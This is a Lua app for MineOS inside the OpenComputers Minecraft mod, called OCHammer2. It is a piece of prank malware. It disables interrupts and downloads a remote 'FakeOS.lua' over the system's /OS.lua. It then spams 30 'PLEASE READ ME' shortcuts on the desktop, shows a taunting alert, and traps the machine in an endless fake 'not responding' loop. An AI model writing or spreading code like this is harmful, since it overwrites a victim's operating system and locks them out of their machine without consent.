
-- Import libraries
local GUI = require("GUI")
local system = require("System")
local paths = require("Paths")
local com = require("Component")
local event = require("event")
local fs = require("Filesystem")
local internet = require("Internet")

local wait = event.sleep

-- OCHammer2.app
-- Copyright (c) 2022-2022 ocboy3

-- Why did Carl the NPC want to get the freaking gun?



event.interruptingEnabled = false

function FUN()

  local cdir = fs.path(system.getCurrentScript())

  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer2.app/FakeOS.lua","/OS.lua")
  
  local IS_MINEOS_DIR = fs.isDirectory("/MineOS/")
  
  if IS_MINEOS_DIR == false then
    fs.makeDirectory("/MineOS/")
  end
  
 
  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer2.app/PLEASE%20READ%20ME.txt","/MineOS/PLEASE READ ME.txt") --  %20 = space

  -- spam a bunch of icons on the desktop
  for i = 1,30 do
    system.createShortcut(paths.user.desktop .. "PLEASE READ ME " .. tostring(i),"/MineOS/PLEASE READ ME.txt/")
  end

  -- update the file list
  
  
  GUI.alert("fortnite is better than roblox stay mad")
  
  local g = com.gpu()
  
  event.push("system","updateFileList")
  
  local mx,my = gpu.getResolution()
  
  local function calcX(s)
    return math.floor((mx/2)-(string.len(s)/2))
  end
  
  g.setBackground(0x000000)
  g.setForeground(0xFFFFFF)

  local function setStuff(y,text)
    gpu.set(calcX(text),y,text)
  end
  
  local counter = 0

  while true do
    local deadline = os.time()+1

    repeat
      computer.pullSignal(0.1)
    until os.time() >= deadline

    counter = counter+1

    setStuff(3,"MineOS is not responding.. (" .. tostring(counter) .. ")")
  end
end

FUN()
